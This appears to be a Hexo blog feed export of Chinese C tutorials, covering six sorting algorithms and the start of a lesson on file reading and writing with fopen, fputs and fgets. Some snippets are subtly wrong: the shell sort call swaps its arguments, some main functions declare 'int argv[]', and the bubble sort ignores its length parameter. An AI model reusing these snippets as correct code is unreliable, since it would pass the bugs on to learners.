        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="冒泡排序"><a href="#冒泡排序" class="headerlink" title="冒泡排序"></a>冒泡排序</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">Effervescence_sort</span><span class="params">(<span class="type">int</span> len,<span class="type">int</span> a[])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> temp;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">9</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">9</span>;j&gt;i;j--)<span class="comment">//找到较小数并依次向上冒泡</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(a[j]&lt;a[j<span class="number">-1</span>])</span><br><span class="line">            &#123;</span><br><span class="line">                temp=a[j];</span><br><span class="line">                a[j]=a[j<span class="number">-1</span>];</span><br><span class="line">                a[j<span class="number">-1</span>]=temp;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc,<span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> a[<span class="number">10</span>];</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Before sorting:&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;a[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    Effervescence_sort(<span class="number">10</span>,a);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;After sorting:&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d\t&quot;</span>,a[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>图像演示：</p><p><img src="/2023/01/14/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/effervescence_sort.gif"></p><h1 id="选择排序"><a href="#选择排序" class="headerlink" title="选择排序"></a>选择排序</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">Chose_sort</span><span class="params">(<span class="type">int</span> len,<span class="type">int</span> a[])</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> min,i,j;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;len<span class="number">-1</span>;j++)<span class="comment">//找到最小数，将最小数按次序依次排列</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(i=j;i&lt;len;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            min=a[j];</span><br><span class="line">            <span class="keyword">if</span>(min&gt;a[i])</span><br><span class="line">            &#123;</span><br><span class="line">                min=a[i];</span><br><span class="line">                a[i]=a[j];</span><br><span class="line">                a[j]=min;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc,<span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> a[<span class="number">10</span>],i;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Before sorting:&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;a[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    Chose_sort(<span class="number">10</span>,a);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;After sorting:&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++)</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\t&quot;</span>,a[i]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>图像演示：</p><p><img src="/2023/01/14/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/chose_sort.gif"></p><h1 id="插入排序"><a href="#插入排序" class="headerlink" title="插入排序"></a>插入排序</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">Insertion_sort</span><span class="params">(<span class="type">int</span> len,<span class="type">int</span> a[])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i,j,temp;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;len;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        temp=a[i];</span><br><span class="line">        <span class="keyword">for</span>(j=i;j&gt;<span class="number">0</span>;j--)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(a[j<span class="number">-1</span>]&gt;temp)</span><br><span class="line">            a[j]=a[j<span class="number">-1</span>];</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">        a[j]=temp;</span><br><span class="line">    &#125;<span class="comment">//若指定项的数值小于前面项，则循环项等于前一项，直到遇到循环项前一项小于指定项的数值，则循环项等于指定项数值</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc,<span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> a[<span class="number">10</span>],i;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Before sorting:&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;a[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    Insertion_sort(<span class="number">10</span>,a);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;After sorting:&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">       <span class="built_in">printf</span>(<span class="string">&quot;%d\t&quot;</span>,a[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>图像演示：</p><p><img src="/2023/01/14/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/Insertion_sort.gif"></p><h1 id="希尔排序"><a href="#希尔排序" class="headerlink" title="希尔排序"></a>希尔排序</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">shell_sort</span><span class="params">(<span class="type">int</span> len,<span class="type">int</span> arr[])</span> &#123;</span><br><span class="line">    <span class="type">int</span> gap, i, j;</span><br><span class="line">    <span class="type">int</span> temp;</span><br><span class="line">    <span class="keyword">for</span> (gap = len &gt;&gt; <span class="number">1</span>; gap &gt; <span class="number">0</span>; gap = gap &gt;&gt; <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">for</span> (i = gap; i &lt; len; i++) &#123;</span><br><span class="line">            temp = arr[i];</span><br><span class="line">            <span class="keyword">for</span> (j = i - gap; j &gt;= <span class="number">0</span> &amp;&amp; arr[j] &gt; temp; j -= gap)</span><br><span class="line">                arr[j + gap] = arr[j];</span><br><span class="line">            arr[j + gap] = temp;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;<span class="comment">//插入排序升级版，在插入排序前先分组排序，再进行插入排序，但不稳定</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc,<span class="type">int</span> argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> a[<span class="number">10</span>],i;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Before sorting:&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;a[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    shell_sort(a,<span class="number">10</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;After sorting:&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++)</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\t&quot;</span>,a[i]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>图像演示：</p><p><img src="/2023/01/14/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/shellsort.gif"></p><h1 id="归并排序"><a href="#归并排序" class="headerlink" title="归并排序"></a>归并排序</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">min</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> x &lt; y ? x : y;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">merge_sort</span><span class="params">(<span class="type">int</span> arr[], <span class="type">int</span> len)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> *a = arr;</span><br><span class="line">    <span class="type">int</span> *b = (<span class="type">int</span> *)<span class="built_in">malloc</span>(len * <span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">    <span class="type">int</span> seg, start;</span><br><span class="line">    <span class="keyword">for</span> (seg = <span class="number">1</span>; seg &lt; len; seg += seg)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (start = <span class="number">0</span>; start &lt; len; start += seg + seg)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">int</span> low = start, mid = min(start + seg, len), high = min(start + seg + seg, len);</span><br><span class="line">            <span class="type">int</span> k = low;</span><br><span class="line">            <span class="type">int</span> start1 = low, end1 = mid;</span><br><span class="line">            <span class="type">int</span> start2 = mid, end2 = high;</span><br><span class="line">            <span class="keyword">while</span> (start1 &lt; end1 &amp;&amp; start2 &lt; end2)</span><br><span class="line">                b[k++] = a[start1] &lt; a[start2] ? a[start1++] : a[start2++];</span><br><span class="line">            <span class="keyword">while</span> (start1 &lt; end1)</span><br><span class="line">                b[k++] = a[start1++];</span><br><span class="line">            <span class="keyword">while</span> (start2 &lt; end2)</span><br><span class="line">                b[k++] = a[start2++];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> *temp = a;</span><br><span class="line">        a = b;</span><br><span class="line">        b = temp;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (a != arr)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> i;</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; len; i++)</span><br><span class="line">            b[i] = a[i];</span><br><span class="line">        b = a;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">free</span>(b);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">int</span> argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> a[<span class="number">10</span>], i;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Before sorting:&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;a[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    merge_sort(a, <span class="number">10</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;After sorting:&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d\t&quot;</span>, a[i]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>图像演示：</p><p><img src="/2023/01/14/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/merge_sort.gif"></p><h1 id="快速排序"><a href="#快速排序" class="headerlink" title="快速排序"></a>快速排序</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">Range</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">int</span> start, end;</span><br><span class="line">&#125; Range;</span><br><span class="line">Range <span class="title function_">new_Range</span><span class="params">(<span class="type">int</span> s, <span class="type">int</span> e)</span></span><br><span class="line">&#123;</span><br><span class="line">    Range r;</span><br><span class="line">    r.start = s;</span><br><span class="line">    r.end = e;</span><br><span class="line">    <span class="keyword">return</span> r;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">swap</span><span class="params">(<span class="type">int</span> *x, <span class="type">int</span> *y)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> t = *x;</span><br><span class="line">    *x = *y;</span><br><span class="line">    *y = t;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">quick_sort</span><span class="params">(<span class="type">int</span> arr[], <span class="type">const</span> <span class="type">int</span> len)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (len &lt;= <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span>; <span class="comment">// 避免len等于负值時引发段错误（Segment Fault）</span></span><br><span class="line">    <span class="comment">// r[]模拟列表,p为数量,r[p++]为push,r[--p]为pop且取得元素</span></span><br><span class="line">    Range r[len];</span><br><span class="line">    <span class="type">int</span> p = <span class="number">0</span>;</span><br><span class="line">    r[p++] = new_Range(<span class="number">0</span>, len - <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">while</span> (p)</span><br><span class="line">    &#123;</span><br><span class="line">        Range range = r[--p];</span><br><span class="line">        <span class="keyword">if</span> (range.start &gt;= range.end)</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        <span class="type">int</span> mid = arr[(range.start + range.end) / <span class="number">2</span>]; <span class="comment">// 选取中间4点为基准点</span></span><br><span class="line">        <span class="type">int</span> left = range.start, right = range.end;</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">while</span> (arr[left] &lt; mid)</span><br><span class="line">                ++left; <span class="comment">// 检测基准点左侧是否符合要求</span></span><br><span class="line">            <span class="keyword">while</span> (arr[right] &gt; mid)</span><br><span class="line">                --right; <span class="comment">// 检测基准点右侧是否符合要求</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (left &lt;= right)</span><br><span class="line">            &#123;</span><br><span class="line">                swap(&amp;arr[left], &amp;arr[right]);</span><br><span class="line">                left++;</span><br><span class="line">                right--; <span class="comment">// 移动指针以继续</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">while</span> (left &lt;= right);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (range.start &lt; right)</span><br><span class="line">            r[p++] = new_Range(range.start, right);</span><br><span class="line">        <span class="keyword">if</span> (range.end &gt; left)</span><br><span class="line">            r[p++] = new_Range(left, range.end);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">int</span> argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> a[<span class="number">10</span>], i;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Before sorting:&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;a[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    quick_sort(a, <span class="number">10</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;After sorting:&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d\t&quot;</span>, a[i]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>图像演示：</p><p><img src="/2023/01/14/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/quick_sort.gif"></p>]]></content>
      
      
      <categories>
          
          <category> C语言 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C语言基础之文件读写操作</title>
      <link href="/2023/01/11/C%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80%E4%B9%8B%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99%E6%93%8D%E4%BD%9C/"/>
      <url>/2023/01/11/C%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80%E4%B9%8B%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99%E6%93%8D%E4%BD%9C/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="打开文件"><a href="#打开文件" class="headerlink" title="打开文件"></a>打开文件</h1><p>使用fopen函数即可打开文件</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FILE *<span class="title function_">fopen</span><span class="params">( <span class="type">const</span> <span class="type">char</span> *filename, <span class="type">const</span> <span class="type">char</span> *mode )</span>;</span><br></pre></td></tr></table></figure><table><thead><tr><th>模式</th><th>描述</th></tr></thead><tbody><tr><td>r</td><td>打开一个已有的文本文件，允许读取文件。</td></tr><tr><td>w</td><td>打开一个文本文件，允许写入文件。如果文件不存在，则会创建一个新文件。在这里，您的程序会从文件的开头写入内容。如果文件存在，则该会被截断为零长度，重新写入。</td></tr><tr><td>a</td><td>打开一个文本文件，以追加模式写入文件。如果文件不存在，则会创建一个新文件。在这里，您的程序会在已有的文件内容中追加内容。</td></tr><tr><td>r+</td><td>打开一个文本文件，允许读写文件。</td></tr><tr><td>w+</td><td>打开一个文本文件，允许读写文件。如果文件已存在，则文件会被截断为零长度，如果文件不存在，则会创建一个新文件。</td></tr><tr><td>a+</td><td>打开一个文本文件，允许读写文件。如果文件不存在，则会创建一个新文件。读取会从文件的开头开始，写入则只能是追加模式。</td></tr></tbody></table><p>如果是二进制文件，则需要以下访问模式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;rb&quot;, &quot;wb&quot;, &quot;ab&quot;, &quot;rb+&quot;, &quot;r+b&quot;, &quot;wb+&quot;, &quot;w+b&quot;, &quot;ab+&quot;, &quot;a+b&quot;</span><br></pre></td></tr></table></figure><h1 id="关闭文件"><a href="#关闭文件" class="headerlink" title="关闭文件"></a>关闭文件</h1><p>通过函数fclose可关闭文件</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">fclose</span><span class="params">( FILE *fp )</span>;</span><br></pre></td></tr></table></figure><p>如果成功关闭文件，<strong>fclose( )</strong> 函数返回零，如果关闭文件时发生错误，函数返回 <strong>EOF</strong>。这个函数实际上，会清空缓冲区中的数据，关闭文件，并释放用于该文件的所有内存。EOF 是一个定义在头文件 <strong>stdio.h</strong> 中的常量</p><h1 id="文件写入"><a href="#文件写入" class="headerlink" title="文件写入"></a>文件写入</h1><p>我们有许多文件写入的函数，其中fputc和fputs最常见，其中fputc是写入单个字符，fputs是写入字符串</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">fputc</span><span class="params">( <span class="type">int</span> c, FILE *fp )</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">fputs</span><span class="params">( <span class="type">const</span> <span class="type">char</span> *s, FILE *fp )</span>;</span><br></pre></td></tr></table></figure><p>举个栗子：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">   FILE *fp = <span class="literal">NULL</span>;</span><br><span class="line"> </span><br><span class="line">   fp = fopen(<span class="string">&quot;E:/test/1.txt&quot;</span>, <span class="string">&quot;w+&quot;</span>);</span><br><span class="line">   <span class="built_in">fprintf</span>(fp, <span class="string">&quot;I love you...\n&quot;</span>);</span><br><span class="line">   <span class="built_in">fputs</span>(<span class="string">&quot;You are beautiful...\n&quot;</span>, fp);</span><br><span class="line">   fclose(fp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="读取文件"><a href="#读取文件" class="headerlink" title="读取文件"></a>读取文件</h1><p>读取文件有三种常用函数：fgetc，fgets，fscanf</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">fgetc</span><span class="params">( FILE * fp )</span>;</span><br><span class="line"><span class="type">char</span> *<span class="title function_">fgets</span><span class="params">( <span class="type">char</span> *buf, <span class="type">int</span> n, FILE *fp )</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">fscanf</span><span 